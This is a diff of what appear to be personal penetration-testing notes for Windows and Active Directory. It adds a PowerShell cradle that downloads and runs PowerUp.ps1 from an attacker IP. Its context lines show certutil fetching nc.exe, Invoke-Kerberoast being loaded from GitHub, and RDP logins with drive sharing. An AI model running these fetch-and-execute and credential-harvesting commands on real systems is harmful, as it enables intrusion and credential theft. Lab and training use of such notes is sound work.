@@ -260,7 +260,8 @@
 - findstr = grep
 - Windows: get file 
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://**IP_ATTACKER/FIlE**
-  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://1**IP_ATTACKER/FIlE**, 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
+  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://1**IP_ATTACKER/FIlE**, 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
+  - iex(New-Object Net.WebClient).DownloadString("http://10.9.1.255:80/PowerUp.ps1")dir
   - powershell -c wget "h**IP_ATTACKER/FIlE** -outfile "PowerUp.ps1"
   - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
 
@@ -269,7 +270,7 @@
 
 - powershell.exe
 
-- Enumerate
+- **Enumerate**
   -  setspn -T medin -Q ​ */* 
 - Invoke Kereberosast script:
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
@@ -501,6 +502,9 @@ net use \\ATTACKER_IP\share /del
 - Basic login
   - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
   - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+
+
+
 
 - Mount local folder:
   - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
